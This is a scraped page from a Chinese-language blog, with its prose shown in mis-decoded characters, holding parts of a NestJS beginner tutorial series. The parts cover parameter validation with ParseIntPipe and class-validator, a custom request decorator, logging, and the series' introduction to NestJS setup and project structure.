<p>ä¿®æ”¹ students.controller.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="comment">// ... </span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// @Get('who-are-you') ..</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// @Post('who-are-you') ...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Get</span>(<span class="string">'get-name-by-id'</span>)</span><br><span class="line">    getNameById(<span class="meta">@Query</span>(<span class="string">'id'</span>, ParseIntPipe) id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.studentsService.getStudentName(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>æµè§ˆå™¨ä½¿ç”¨å‚æ•°è®¿é—®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:3000/students/get-name-by-id?id=gdccwxx</span><br><span class="line">// =&gt; &#123;</span><br><span class="line">//     statusCode: 400,</span><br><span class="line">//     message: &quot;Validation failed (numeric string is expected)&quot;,</span><br><span class="line">//     error: &quot;Bad Request&quot;</span><br><span class="line">// &#125;  âŒ</span><br><span class="line"></span><br><span class="line">http://localhost:3000/students/get-name-by-id?id=1</span><br><span class="line">// =&gt; gdccwxx  âœ…</span><br></pre></td></tr></table></figure></p>
<p>å½“ä½¿ç”¨éæ³•è¯·æ±‚ï¼Œå¯¼è‡´æ— æ³•è½¬æ¢æ—¶ï¼ŒNestJs ä¼šå°†è¯·æ±‚æŠ¥é”™å¤„ç†ï¼Œè€Œæ­£ç¡®å‚æ•°åˆ™ä¼šè½¬æ¢åè°ƒç”¨è°ƒç”¨ç›¸åº”å‡½æ•°ã€‚é€šè¿‡ç®€å•çš„è£…é¥°å™¨å¼•ç”¨ï¼Œ NestJs æ¡†æ¶å°±å¯ä»¥è‡ªåŠ¨åšäº†å‚æ•°æ£€æŸ¥ä¸è½¬æ¢äº†</p>
<h2 id="Post-è¯·æ±‚"><a href="#Post-è¯·æ±‚" class="headerlink" title="Post è¯·æ±‚"></a>Post è¯·æ±‚</h2><p>Post è¯·æ±‚ç•¥å¾®æœ‰äº›ä¸ä¸€æ ·ï¼Œè¦ç”¨åˆ° class-validator</p>
<p>å®‰è£… class-validator<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save class-validator class-transformer</span><br></pre></td></tr></table></figure></p>
<p>ä¿®æ”¹ main.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; NestFactory &#125; <span class="keyword">from</span> <span class="string">'@nestjs/core'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ValidationPipe &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppModule &#125; <span class="keyword">from</span> <span class="string">'./app.module'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> NestFactory.create(AppModule);</span><br><span class="line">  app.useGlobalPipes(<span class="keyword">new</span> ValidationPipe());</span><br><span class="line">  <span class="keyword">await</span> app.listen(<span class="number">3000</span>);</span><br><span class="line">&#125;</span><br><span class="line">bootstrap();</span><br></pre></td></tr></table></figure></p>
<p>ä¿®æ”¹ student.dto.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; IsNotEmpty, IsString &#125; <span class="keyword">from</span> <span class="string">'class-validator'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentDto &#123;</span><br><span class="line">    <span class="meta">@IsNotEmpty</span>()</span><br><span class="line">    <span class="meta">@IsString</span>()</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡å‘½ä»¤è¡Œè®¿é—®<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST  http://127.0.0.1:3000/students/who-are-you</span><br><span class="line">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;,&quot;name should not be empty&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;% âŒ</span><br><span class="line"></span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: 1&#125;&apos;</span><br><span class="line">// =&gt; &#123;&quot;statusCode&quot;:400,&quot;message&quot;:[&quot;name must be a string&quot;],&quot;error&quot;:&quot;Bad Request&quot;&#125;% âŒ</span><br><span class="line"></span><br><span class="line">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br><span class="line">// =&gt; Im student gdccwxx% âœ…</span><br></pre></td></tr></table></figure></p>
<p>åˆ°æ­¤ï¼Œå‚æ•°æ ¡éªŒéƒ¨åˆ†ä¹Ÿå°±å®Œæˆã€‚</p>
<h1 id="å››ã€è‡ªå®šä¹‰è£…é¥°å™¨"><a href="#å››ã€è‡ªå®šä¹‰è£…é¥°å™¨" class="headerlink" title="å››ã€è‡ªå®šä¹‰è£…é¥°å™¨"></a>å››ã€è‡ªå®šä¹‰è£…é¥°å™¨</h1><p>åœ¨ post è¯·æ±‚ç”¨åˆ°äº†å¤§é‡çš„è£…é¥°å™¨ï¼Œç³»ç»Ÿè£…é¥°å™¨èƒ½æ»¡è¶³å¤§éƒ¨åˆ†åœºæ™¯ï¼Œä½†æ˜¯æœ‰äº›ç‰¹å®šéœ€æ±‚æ—¶ï¼Œéœ€è¦è‡ªå®šä¹‰è£…é¥°å™¨ã€‚</p>
<p>ä¾‹å¦‚è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼šæ¯ä¸ªè¯·æ±‚éƒ½ä¼šå¸¦ä¸Š <code>user</code> å­—æ®µã€‚ä»£è¡¨æ˜¯è°åšçš„è¯·æ±‚ï¼Œæ¯æ¬¡åœ¨ä»£ç é‡Œ getUser æ˜¯éå¸¸éš¾å—çš„äº‹æƒ…ï¼Œè¿™æ—¶è‡ªå®šä¹‰è£…é¥°å™¨å°±æ´¾ä¸Šäº†ç”¨åœºã€‚</p>
<p>æ–°å»º src/common/decorators.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src/common/decorators.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; createParamDecorator, ExecutionContext &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> User = createParamDecorator(</span><br><span class="line">  (data: unknown, ctx: ExecutionContext) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> request = ctx.switchToHttp().getRequest(); <span class="comment">// æ‹¿åˆ°è¯·æ±‚</span></span><br><span class="line">    <span class="keyword">return</span> request.body.user;</span><br><span class="line">  &#125;,</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>ä¿®æ”¹ students.controller.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Body, Controller, Get, Post, Query, ParseIntPipe &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; StudentsService &#125; <span class="keyword">from</span> <span class="string">'./students.service'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">'../common/decorators'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">'students'</span>)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsController &#123;</span><br><span class="line">    <span class="keyword">constructor</span>(<span class="params"><span class="keyword">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class="line">    <span class="comment">// @Get('who-are-you') ...</span></span><br><span class="line">    <span class="comment">// @Post('who-are-you') ...</span></span><br><span class="line">    <span class="comment">// @Get('get-name-by-id')...</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Post</span>(<span class="string">'who-is-request'</span>)</span><br><span class="line">    whoIsReq(<span class="meta">@User</span>() user: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>å‘½ä»¤è¡Œè®¿é—®<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://127.0.0.1:3000/students/who-is-request -H <span class="string">'Content-Type: application/json'</span> -d <span class="string">'&#123;"user": "gdccwxx"&#125;'</span></span><br><span class="line">// =&gt; gdccwxx% âœ…</span><br></pre></td></tr></table></figure></p>
<p>é€šè¿‡è‡ªå®šä¹‰è£…é¥°å™¨ï¼Œå¹¶å°†å…¶æŒ‚åœ¨å‡½æ•°ä¸Šï¼Œä»£ç å°±èƒ½ä¼˜é›…çš„è·å–æ˜¯è°è¯·æ±‚çš„å€Ÿå£ã€‚</p>
<h1 id="äº”ã€æ—¥å¿—"><a href="#äº”ã€æ—¥å¿—" class="headerlink" title="äº”ã€æ—¥å¿—"></a>äº”ã€æ—¥å¿—</h1><p>åå°æ¥å£è¯·æ±‚å¸¸ä¼´éšæ—¥å¿—äº§ç”Ÿï¼Œæ—¥å¿—å¯¹åå°æŸ¥é—®é¢˜è‡³å…³é‡è¦ã€‚NestJs æ¡†æ¶ä¹Ÿé›†æˆäº†æ—¥å¿—ï¼Œå¼€ç®±å³ç”¨ã€‚</p>
<p>ä½¿ç”¨æ—¥å¿—åˆ†ä¸ºä¸‰æ­¥:</p>
<ul>
<li>main.ts å¼•å…¥ <code>Logger</code></li>
<li>æ¨¡å—å¼•å…¥æ—¥å¿—ç»„å»º: <code>private readonly logger = new Logger(StudentsService.name)</code>;</li>
<li>åœ¨éœ€è¦æ‰“å°çš„åœ°æ–¹å¼•å…¥: this.logger.log(`student name is ${name}`);</li>
</ul>
<p>ä¿®æ”¹main.ts<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.ts</span></span><br><span class="line"><span class="keyword">import</span> &#123; NestFactory &#125; <span class="keyword">from</span> <span class="string">'@nestjs/core'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ValidationPipe, Logger &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; AppModule &#125; <span class="keyword">from</span> <span class="string">'./app.module'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">bootstrap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> app = <span class="keyword">await</span> NestFactory.create(AppModule, &#123;</span><br><span class="line">    logger: <span class="keyword">new</span> Logger(),</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure></p>
<p>å¼•ç”¨ Logger ç»„å»º<br><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Injectable, Logger &#125; <span class="keyword">from</span> <span class="string">'@nestjs/common'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Injectable</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> StudentsService &#123;</span><br><span class="line">    <span class="keyword">private</span> readonly logger = <span class="keyword">new</span> Logger(StudentsService.name);</span><br><span class="line"></span><br><span class="line">    ImStudent(name?: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.log(<span class="string">`student name is <span class="subst">$&#123;name&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Im student '</span> + name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getStudentName(id: <span class="built_in">number</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.logger.log(<span class="string">`get student id is <span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">const</span> ID_NAME_MAP = &#123;</span><br><span class="line">            <span class="number">1</span>: <span class="string">'gdccwxx'</span>,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ID_NAME_MAP[id] ?? <span class="string">'not found'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>è®¿é—®æ¥å£ï¼Œæ§åˆ¶å°è¾“å‡º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://127.0.0.1:3000/students/who-are-you -H &apos;Content-Type: application/json&apos; -d &apos;&#123;&quot;name&quot;: &quot;gdccwxx&quot;&#125;&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="/nestJs/nest-js-tutorial-2/./log.png" alt="logger"></p>
<p>å®Œæ•´ç¤ºä¾‹å¯ä»¥åœ¨ <a href="https://github.com/gdccwxx/nest-test" target="_blank" rel="noopener">github</a> æ‰¾åˆ°ã€‚</p>
<p>å¤„ç†è¯·æ±‚çš„åŸºæœ¬æ–¹æ³•å°±è®²åˆ°è¿™é‡Œï¼Œ<a href="/nestJs/nest-js-tutorial-3/" title="ä¸‹ä¸€ç¯‡">ä¸‹ä¸€ç¯‡</a>ä¼šè®²è§£å¦‚ä½•è¿æ¥æ•°æ®åº“å¹¶ä½¿ç”¨</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/nestJs/nest-js-tutorial-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/nestJs/nest-js-tutorial-1/" itemprop="url">NestJs å…¥é—¨æ•™ç¨‹ä¹‹ä¸€ï¼šåˆæ¬¡ä¸Šæ‰‹</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-09-11T23:45:27+08:00">
                2021-09-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>è‡ªä» Node å‡ºä¸–ä»¥æ¥ï¼Œè®¸å¤š Javascript åç«¯æ¡†æ¶éƒ½æ›¾å¤„ä¸ç©·ï¼Œéœ€æ±‚ä¹Ÿååˆ†åºå¤§ã€‚</p>
<p><img src="/nestJs/nest-js-tutorial-1/./nodejs.png" alt="nodejs"></p>
<p>Node åšåç«¯å·²ç»æˆä¸ºå‰ç«¯çš„é‡è¦ä¸šåŠ¡ï¼Œéšç€å‰ç«¯ä¸šåŠ¡çš„ä¸æ–­æ›´è¿­ï¼ŒNode ä¹Ÿåœ¨å‰ç«¯é¢†åŸŸä¹Ÿé€æ¸ç«™ç¨³è„šè·Ÿï¼Œå¸‚åœºæ‹›è˜éœ€æ±‚é€æ¸æ—ºç››ï¼Œä¼ä¸šéƒ½æŠ¢ç€è¦ã€‚</p>
<p>å°½ç®¡ Node æ¡†æ¶å·²ç»é€æ¸å®Œå–„ï¼Œä½†æ˜¯å›½å¤–éå¸¸ç«çš„æ¡†æ¶ NestJs æ•™ç¨‹å´ååˆ†ç¨€ç¼ºï¼Œå›½å†…æ•™ç¨‹ä¹Ÿéƒ½è‰¯è ä¸é½ï¼Œå¯¹åˆæ¬¡ä¸Šæ‰‹è€…ååˆ†ä¸å‹å¥½ã€‚</p>
<p>æœ¬ç³»åˆ—æ–‡ç« ä¸»è¦è®²æˆ‘åœ¨å·¥ä½œä¸­é‡åˆ°çš„é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆï¼Œå¹¶æ¢³ç†æˆæ•™ç¨‹æ–¹å¼ï¼Œå¸Œæœ›å¯¹åˆå­¦è€…æœ‰ç”¨ã€‚ç›®æ ‡æ˜¯ç»è¿‡æ­¤ä¸ªç³»åˆ—æ–‡ç« ï¼Œèƒ½æ­å»ºä¸€å¥— NestJs åœ¨æ—¥å¸¸ç¼–ç è¿‡ç¨‹ä¸­ä¼šç”¨åˆ°çš„åŠŸèƒ½ã€‚</p>
<p>è€ƒè™‘åˆ° NestJs åŠŸèƒ½æ¯”è¾ƒå¤šï¼Œæœ¬æ•™ç¨‹ä¼šé€‰è¾ƒä¸ºå¸¸ç”¨çš„åŠŸèƒ½ï¼Œåˆ†ä¸ºå››æ¬¡æ¬¡è¿è½½ã€‚</p>
<p><img src="/nestJs/nest-js-tutorial-1/./nestjs.png" alt="nestjs"></p>
<h1 id="ä¸€ã€NestJs-æ˜¯å•¥"><a href="#ä¸€ã€NestJs-æ˜¯å•¥" class="headerlink" title="ä¸€ã€NestJs æ˜¯å•¥"></a>ä¸€ã€NestJs æ˜¯å•¥</h1><p>å­¦ä¹  NestJS ä¹‹å‰ï¼Œå…ˆç®€å•è¯´ä¸€ä¸‹ï¼Œå®ƒåˆ°åº•æ˜¯å•¥ã€‚</p>
<p>å­—é¢æ„æ€æ¥è®²ï¼Œå®ƒæ˜¯ä¸€ä¸ªä»¥ JS ä»£ç çš„æ–¹å¼è¿è¡Œ JS çš„æ¡†æ¶ã€‚</p>
<p>ä» <a href="https://nestjs.com/" target="_blank" rel="noopener">NestJs å®˜ç½‘</a> æ¥çœ‹ï¼ŒNestJS æ˜¯è¿è¡Œåœ¨æœåŠ¡ç«¯çš„ä¸€ä¸ª JS æ¡†æ¶ã€‚å®ƒè¿è¡Œæ—¶æ˜¯ <code>JavaScript</code>ï¼Œç¼–ç¨‹æ—¶ä½¿ç”¨<code>TypeScript</code>, æ˜¯ç»“åˆçµæ´»æ€§ã€å¯æ‰©å±•æ€§çš„æ¡†æ¶ã€‚å¹¶ä¸”ç»“åˆäº†é¢å‘å¯¹è±¡ç¼–ç¨‹(OOP)ã€å‡½æ•°å¼ç¼–ç¨‹(FP)å’Œå‡½æ•°å“åº”å¼ç¼–ç¨‹(FRP)</p>
<p>å®ƒçš„ç‰¹æ®Šä¹‹å¤„åœ¨äºï¼Œä»¥å‰ä½¿ç”¨ JS æ–¹å¼å†™åå°ä»£ç ï¼Œç°åœ¨é€šè¿‡å†™ TS, å†ç¼–è¯‘æˆ JS è¿è¡Œã€‚æ—¢åŒ…å«äº† JS çš„çµæ´»æ€§ï¼Œåˆæœ‰ TS çš„çº¦æŸã€‚</p>
<h1 id="äºŒã€NestJS-çš„ä¼˜åŠ¿"><a href="#äºŒã€NestJS-çš„ä¼˜åŠ¿" class="headerlink" title="äºŒã€NestJS çš„ä¼˜åŠ¿"></a>äºŒã€NestJS çš„ä¼˜åŠ¿</h1><p>NestJS æœ€å¤§çš„ä¼˜åŠ¿ï¼Œæ˜¯ä»–åŸºäº TypeScriptã€‚</p>
<p>åå°æ¥å£éœ€è¦æ¸…æ™°çš„å…¥å‚å’Œå‡ºå‚ï¼Œéœ€è¦å¯¹å‡½æ•°å’Œæ¥å£å¼ºçº¦æŸï¼Œç»´æŠ¤æ—¶æ‰èƒ½ä¿è¯æ¥å£çš„å¯é æ€§ã€‚</p>
<p>è€Œä¸”ï¼ŒNestJs çš„æ˜¯åŸºäº Express çš„è¿›è¡Œå¼€å‘çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®Œç¾çš„å¤ç”¨æˆç†Ÿçš„ç”Ÿæ€ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å»å¸‚åœºæ‰¾ç¬¬ä¸‰æ–¹åŒ…ã€‚</p>
<h1 id="ä¸‰ã€çŸ¥è¯†å‡†å¤‡"><a href="#ä¸‰ã€çŸ¥è¯†å‡†å¤‡" class="headerlink" title="ä¸‰ã€çŸ¥è¯†å‡†å¤‡"></a>ä¸‰ã€çŸ¥è¯†å‡†å¤‡</h1><p>ç”±äº NestJs æ˜¯åŸºäº Node çš„ç¯å¢ƒï¼Œå› æ­¤éœ€è¦å…·å¤‡åŸºç¡€çš„çŸ¥è¯†ã€‚</p>
<ul>
<li>HTTP: äº†è§£åŸºæœ¬çš„ Getã€Post è¯·æ±‚</li>
<li>Nodeï¼šåŸºæœ¬æ˜ç™½æ¥å£è¯·æ±‚ï¼ŒçŸ¥é“æœåŠ¡ä¸æ¥å£å…³ç³»å³å¯</li>
<li>Typescriptï¼šåŸºæœ¬æ‡‚è¯­æ³•ï¼Œèƒ½å¤§è‡´çŸ¥é“è£…é¥°å™¨å’Œ interface</li>
</ul>
<p>æœ€å¥½ä¹‹å‰ç”¨è¿‡ Node ç›¸å…³æœåŠ¡ï¼Œä½¿ç”¨ Node æ­å»ºè¿‡åå°æœåŠ¡ï¼Œä½†è¿™ä¸æ˜¯å¿…è¦çš„ã€‚</p>
<h1 id="å››ã€å¼€å‘å‡†å¤‡"><a href="#å››ã€å¼€å‘å‡†å¤‡" class="headerlink" title="å››ã€å¼€å‘å‡†å¤‡"></a>å››ã€å¼€å‘å‡†å¤‡</h1><p>1ã€å®‰è£… Node ç¯å¢ƒï¼šè®¿é—® <a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node ä¸‹è½½åœ°å€</a>. ä¸‹è½½å®‰è£…åï¼ŒNode &gt;= 10.13.0 å³å¯, å¯é€šè¿‡å‘½ä»¤è¡Œæ£€æŸ¥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>
<p>2ã€å®‰è£… NestJS cli</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i -g @nestjs/cli</span><br></pre></td></tr></table></figure>
<h1 id="äº”ã€Hello-World"><a href="#äº”ã€Hello-World" class="headerlink" title="äº”ã€Hello World"></a>äº”ã€Hello World</h1><h2 id="åˆ›å»º-nest-test-é¡¹ç›®"><a href="#åˆ›å»º-nest-test-é¡¹ç›®" class="headerlink" title="åˆ›å»º nest-test é¡¹ç›®"></a>åˆ›å»º nest-test é¡¹ç›®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// step1</span><br><span class="line">nest new nest-test</span><br><span class="line"></span><br><span class="line">// step2 Which package manager would you</span><br><span class="line">é€‰æ‹©: npm</span><br></pre></td></tr></table></figure>
<h2 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h2><p>è¿™æ ·å°±å¾—åˆ°äº† src/ ç›®å½•ä¸ºè¿™æ ·çš„æ–‡ä»¶åˆ—è¡¨äº†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">src</span><br><span class="line">  |- app.controller.spec.ts // controller çš„æµ‹è¯•æ–‡ä»¶</span><br><span class="line">  |- app.controller.ts      // controllerï¼Œè·¯ç”±å’Œé¢„å¤„ç†</span><br><span class="line">  |- app.module.ts          // moduleï¼Œä¸ºæ¨¡å—æ³¨å†Œç”¨</span><br><span class="line">  |- app.service.ts         // service çœŸæ­£çš„é€»è¾‘</span><br><span class="line">  |- main.ts                // ç¨‹åºå…¥å£</span><br></pre></td></tr></table></figure></p>
<p>NestJS ä¹Ÿä¸»å¼ çš„æ˜¯ <a href="https://zh.wikipedia.org/wiki/MVC" target="_blank" rel="noopener">MVC</a> çš„æ ¼å¼ã€‚</p>
<h2 id="module"><a href="#module" class="headerlink" title="module"></a>module</h2><p><img src="/nestJs/nest-js-tutorial-1/./module.png" alt="module"></p>
<p>module çš„ä½œç”¨æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶ç»™æ¨¡å—å¤„ç†ä¾èµ–ã€‚å¥½å¤„æ˜¯æ‰€æœ‰æ¨¡å—çš„ä¾èµ–éƒ½å¯ä»¥åœ¨ module ä¸­æ¸…æ™°æ˜äº†çš„çŸ¥é“å¼•ç”¨è¿˜æ˜¯è¢«å¼•ç”¨</p>
<h2 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h2><p><img src="/nestJs/nest-js-tutorial-1/./controllers.png" alt="controller"></p>
<p>controller çš„ä½œç”¨æ˜¯å¤„ç†è¯·æ±‚ï¼Œæ‰€æœ‰çš„è¯·æ±‚ä¼šå…ˆåˆ° controllerï¼Œå†ç» controller è°ƒç”¨å…¶ä»–æ¨¡å—ä¸šåŠ¡é€»è¾‘</p>
<h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><p>æ˜¯çœŸæ­£å¤„ç†ä¸šåŠ¡é€»è¾‘çš„åœ°æ–¹ï¼Œæ‰€æœ‰çš„ä¸šåŠ¡é€»è¾‘éƒ½ä¼šåœ¨è¿™é‡Œå¤„ç†ã€‚å®ƒå¯ç»è¿‡ module å¼•ç”¨å…¶ä»–æ¨¡å—çš„serviceï¼Œä¹Ÿå¯ç»è¿‡ module æš´éœ²å‡ºå»ã€‚</p>
